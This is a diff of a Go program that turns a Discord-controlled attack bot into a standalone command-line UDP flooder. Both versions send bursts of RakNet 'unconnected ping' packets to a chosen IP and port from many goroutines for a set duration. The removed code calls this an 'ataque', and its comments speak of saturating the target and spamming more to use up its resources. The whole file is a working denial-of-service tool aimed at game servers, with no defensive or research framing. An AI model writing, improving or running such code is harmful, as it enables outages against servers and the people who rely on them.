@@ -1,215 +1,131 @@
 package main
 
 import (
-	"fmt"
-	"net"
 	"os"
-	"os/exec"
 	"strconv"
-	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 	"math/rand"
-	"bufio"
-
-	"github.com/bwmarrin/discordgo"
+	"net"
 )
 
-var (
-	attackCancel     chan struct{}
-	attackOnce       sync.Once
-	attackIsRunning  bool
-	processMutex     sync.Mutex
-)
+type Config struct {
+	Target        string
+	MaxConnections int
+	Duration      time.Duration
+}
+
+type HandshakeManager struct {
+	config       *Config
+	stopChan     chan struct{}
+	wg           sync.WaitGroup
+	totalReqs    int32
+	failedReqs   int32
+}
+
+func NewHandshakeManager(config *Config) *HandshakeManager {
+	return &HandshakeManager{
+		config:   config,
+		stopChan: make(chan struct{}),
+	}
+}
+
+func (hm *HandshakeManager) Start() {
+	workers := 50
+	if hm.config.MaxConnections < 1000 {
+		workers = 20
+	}
+
+	for i := 0; i < workers; i++ {
+		hm.wg.Add(1)
+		go hm.handshakeWorker()
+	}
+
+	// Finaliza al cumplirse la duración
+	if hm.config.Duration > 0 {
+		hm.wg.Add(1)
+		go hm.durationTimer()
+	}
+
+	hm.wg.Wait()
+}
+
+func (hm *HandshakeManager) Stop() {
+	close(hm.stopChan)
+	hm.wg.Wait()
+}
+
+func (hm *HandshakeManager) durationTimer() {
+	defer hm.wg.Done()
+	select {
+	case <-time.After(hm.config.Duration):
+		hm.Stop()
+	case <-hm.stopChan:
+		return
+	}
+}
+
+func (hm *HandshakeManager) handshakeWorker() {
+	defer hm.wg.Done()
+	for {
+		select {
+		case <-hm.stopChan:
+			return
+		default:
+			active := atomic.LoadInt32(&hm.totalReqs) - atomic.LoadInt32(&hm.failedReqs)
+			if active >= int32(hm.config.MaxConnections) {
+				time.Sleep(15 * time.Millisecond)
+				continue
+			}
+			err := hm.sendHandshake()
+			if err != nil {
+				atomic.AddInt32(&hm.failedReqs, 1)
+				time.Sleep(10 * time.Millisecond)
+			}
+		}
+	}
+}
+
+func (hm *HandshakeManager) sendHandshake() error {
+	c, err := net.Dial("udp", hm.config.Target)
+	if err != nil {
+		return err
+	}
+	defer c.Close()
+
+	// Packet ID for UNCONNECTED_PING is 0x01. El resto puede ser random, clientId y padding.
+	packet := make([]byte, 25)
+	packet[0] = 0x01
+	rand.Read(packet[1:])
+	_, err = c.Write(packet)
+	atomic.AddInt32(&hm.totalReqs, 1)
+	return err
+}
 
 func main() {
-	token := os.Getenv("DISCORD_BOT_TOKEN")
-	if token == "" {
-		// Nuevo: Pedir token si no está, guardar en token.txt
-		data, err := os.ReadFile("token.txt")
-		if err != nil || len(strings.TrimSpace(string(data))) == 0 {
-			fmt.Print("Introduce tu DISCORD_BOT_TOKEN: ")
-			reader := bufio.NewReader(os.Stdin)
-			tk, _ := reader.ReadString('\n')
-			token = strings.TrimSpace(tk)
-			os.WriteFile("token.txt", []byte(token), 0600)
-		} else {
-			token = strings.TrimSpace(string(data))
-		}
+	if len(os.Args) < 5 {
+		os.Exit(1)
 	}
 
-	if token == "" {
-		fmt.Println("Error: No se proporcionó un DISCORD_BOT_TOKEN válido")
-		return
-	}
-
-	dg, err := discordgo.New("Bot " + token)
+	ip := os.Args[1]
+	port := os.Args[2]
+	maxConn, err := strconv.Atoi(os.Args[3])
 	if err != nil {
-		fmt.Println("Error creando Discord session:", err)
-		return
+		os.Exit(1)
 	}
 
-	dg.AddHandler(messageCreate)
-
-	err = dg.Open()
+	seconds, err := strconv.Atoi(os.Args[4])
 	if err != nil {
-		fmt.Println("Error abriendo conexión:", err)
-		return
+		os.Exit(1)
 	}
 
-	fmt.Println("Bot está corriendo. Presiona CTRL+C para salir.")
-	<-make(chan struct{})
-	dg.Close()
-}
-
-func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-	if m.Author.ID == s.State.User.ID {
-		return
-	}
-	content := strings.TrimSpace(m.Content)
-	args := strings.Fields(content)
-	if len(args) == 0 {
-		return
-	}
-	switch args[0] {
-	case ".raknet":
-		handleRaknetCommand(s, m, args[1:])
-	case ".stop":
-		handleStopCommand(s, m)
-	case ".help":
-		handleHelpCommand(s, m)
-	}
-}
-
-func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
-	processMutex.Lock()
-	defer processMutex.Unlock()
-
-	if attackIsRunning {
-		s.ChannelMessageSend(m.ChannelID, "Ya hay un ataque corriendo.")
-		return
-	}
-	if len(args) < 4 {
-		s.ChannelMessageSend(m.ChannelID, "`.raknet <ip> <puerto> <conexiones> <segundos>`")
-		return
+	config := &Config{
+		Target:        ip + ":" + port,
+		MaxConnections: maxConn,
+		Duration:      time.Duration(seconds) * time.Second,
 	}
 
-	ip := args[0]
-	port := args[1]
-	connections := args[2]
-	timeSeconds := args[3]
-
-	if !isValidIP(ip) {
-		s.ChannelMessageSend(m.ChannelID, "IP no válida")
-		return
-	}
-	if !isValidPort(port) {
-		s.ChannelMessageSend(m.ChannelID, "Puerto no válido")
-		return
-	}
-	numConn, err1 := strconv.Atoi(connections)
-	durSec, err2 := strconv.Atoi(timeSeconds)
-	if err1 != nil || err2 != nil || numConn <= 0 || durSec <= 0 {
-		s.ChannelMessageSend(m.ChannelID, "Argumentos no válidos")
-		return
-	}
-
-	attackIsRunning = true
-	attackCancel = make(chan struct{})
-	s.ChannelMessageSend(m.ChannelID, "Ataque iniciado")
-	go raknetAttack(ip, port, numConn, time.Duration(durSec)*time.Second, s, m.ChannelID)
-}
-
-func handleStopCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
-	processMutex.Lock()
-	defer processMutex.Unlock()
-	if !attackIsRunning {
-		s.ChannelMessageSend(m.ChannelID, "No hay ataque corriendo")
-		return
-	}
-	attackOnce = sync.Once{}
-	close(attackCancel)
-	attackIsRunning = false
-	s.ChannelMessageSend(m.ChannelID, "Ataque detenido")
-}
-
-func handleHelpCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
-	helpMsg := "**Comandos disponibles:**\n" +
-		".raknet <ip> <puerto> <conexiones> <segundos>\n" +
-		".stop - Detiene los ataques\n" +
-		".help - Muestra esta ayuda\n\n"
-	s.ChannelMessageSend(m.ChannelID, helpMsg)
-}
-
-func isValidIP(ip string) bool {
-	if ip == "localhost" {
-		return true
-	}
-	parts := strings.Split(ip, ".")
-	if len(parts) != 4 {
-		return false
-	}
-	for _, part := range parts {
-		num, err := strconv.Atoi(part)
-		if err != nil || num < 0 || num > 255 {
-			return false
-		}
-	}
-	return true
-}
-func isValidPort(port string) bool {
-	p, err := strconv.Atoi(port)
-	if err != nil {
-		return false
-	}
-	return p > 0 && p <= 65535
-}
-
-// --------------- EL ATAQUE: SOLO HANDSHAKE - CONEXIÓN PARCIAL ---------------
-func raknetAttack(ip, port string, connections int, duration time.Duration, s *discordgo.Session, channelID string) {
-	addr := net.JoinHostPort(ip, port)
-	end := time.Now().Add(duration)
-	var wg sync.WaitGroup
-
-	for i := 0; i < connections; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for {
-				select {
-				case <-attackCancel:
-					return
-				default:
-					if time.Now().After(end) {
-						return
-					}
-					// Solo handshake RakNet: UDP "unconnected ping" packet
-					conn, err := net.Dial("udp", addr)
-					if err == nil {
-						defer conn.Close()
-						// Packet ID for UNCONNECTED_PING is 0x01
-						ping := make([]byte, 25)
-						ping[0] = 0x01
-						// Los siguientes bytes pueden ser random/0 (client ID más padding, da igual para saturar)
-						rand.Read(ping[1:])
-						conn.Write(ping)
-					}
-					// Puedes ajustar para spamear más, menos sleep = más consumo target
-					time.Sleep(30 * time.Millisecond)
-				}
-			}
-		}()
-	}
-	go func() {
-		// Cuando termine duración o stop
-		select {
-		case <-attackCancel:
-		case <-time.After(duration):
-		}
-		processMutex.Lock()
-		attackIsRunning = false
-		processMutex.Unlock()
-		s.ChannelMessageSend(channelID, "Ataque finalizado")
-	}()
-	wg.Wait()
+	manager := NewHandshakeManager(config)
+	manager.Start()
 }
